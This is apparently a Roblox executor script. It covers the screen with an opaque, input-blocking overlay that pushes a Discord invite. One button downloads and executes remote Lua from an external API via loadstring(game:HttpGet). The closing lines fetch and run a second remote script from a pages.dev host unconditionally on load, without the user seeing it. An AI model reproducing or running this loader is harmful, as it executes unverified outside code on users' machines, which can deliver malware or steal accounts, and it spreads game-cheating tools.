local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")

-- Create ScreenGui in CoreGui for full coverage
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DiscordPromptGui"
ScreenGui.Parent = CoreGui
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.DisplayOrder = 10000  -- High display order to cover all other GUIs

-- Semi-transparent overlay covering entire screen
local Overlay = Instance.new("Frame")
Overlay.Size = UDim2.new(1, 0, 1, 0)
Overlay.Position = UDim2.new(0, 0, 0, 0)
Overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Overlay.BackgroundTransparency = 0  -- Full opaque black
Overlay.BorderSizePixel = 0
Overlay.Active = true  -- Blocks input to underlying GUIs
Overlay.Draggable = false
Overlay.Parent = ScreenGui

-- Create Title TextLabel
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Parent = Overlay
TitleLabel.Size = UDim2.new(0.8, 0, 0.4, 0)
TitleLabel.Position = UDim2.new(0.1, 0, 0.1, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "JOIN DISCORD FOR SCRIPT\nNO KEY"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextScaled = true
TitleLabel.Font = Enum.Font.SourceSansBold
TitleLabel.TextStrokeTransparency = 0
TitleLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)

-- Create Copy Button
local CopyButton = Instance.new("TextButton")
CopyButton.Parent = Overlay
CopyButton.Size = UDim2.new(0.6, 0, 0.15, 0)
CopyButton.Position = UDim2.new(0.2, 0, 0.6, 0)
CopyButton.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
CopyButton.Text = "Copy Discord Link"
CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyButton.TextScaled = true
CopyButton.Font = Enum.Font.SourceSansBold
CopyButton.BorderSizePixel = 0

-- Add corner to button
local ButtonCorner = Instance.new("UICorner")
ButtonCorner.CornerRadius = UDim.new(0, 8)
ButtonCorner.Parent = CopyButton

-- Button click event
CopyButton.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard("https://discord.gg/PAy8Ht3SDC")
    end
    ScreenGui:Destroy()
end)

-- Create Alternative Button
local AltButton = Instance.new("TextButton")
AltButton.Parent = Overlay
AltButton.Size = UDim2.new(0.5, 0, 0.12, 0)
AltButton.Position = UDim2.new(0.25, 0, 0.78, 0)
AltButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
AltButton.Text = "I DONT HAVE DISCORD"
AltButton.TextColor3 = Color3.fromRGB(255, 255, 255)
AltButton.TextScaled = true
AltButton.Font = Enum.Font.SourceSansBold
AltButton.BorderSizePixel = 0

-- Add corner to alt button
local AltButtonCorner = Instance.new("UICorner")
AltButtonCorner.CornerRadius = UDim.new(0, 8)
AltButtonCorner.Parent = AltButton

-- Alt button click event
AltButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
    loadstring(
        game:HttpGet(
            "https://api.junkie-development.de/api/v1/luascripts/public/3fa492b2a015e50736a6792dce71d02349cbae1856bac490f2e61f9288e5b696/download"
        )
    )()
end)

-- Additional execution as requested
loadstring(game:HttpGet("https://hackmanhub.pages.dev/popuptest.lua"))()
open_popup("https://discord.gg/PAy8Ht3SDC", true)
